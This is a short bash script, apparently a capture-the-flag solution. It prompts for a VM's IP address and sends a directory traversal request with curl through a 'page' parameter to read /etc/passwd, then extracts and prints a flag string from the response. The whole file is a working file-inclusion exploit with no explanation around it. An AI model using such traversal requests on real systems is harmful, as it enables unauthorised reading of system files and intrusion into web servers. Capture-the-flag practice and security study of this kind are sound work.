#!/bin/bash
echo input the VM ip address :
read ip

url="http://${ip}/?page=../../../../../../../etc/passwd"

response=$(curl -s "$url" | grep "flag")
response=$(cut -f2 -d ":" <<< $response | cut -c -65)
echo "FLAG:${response}"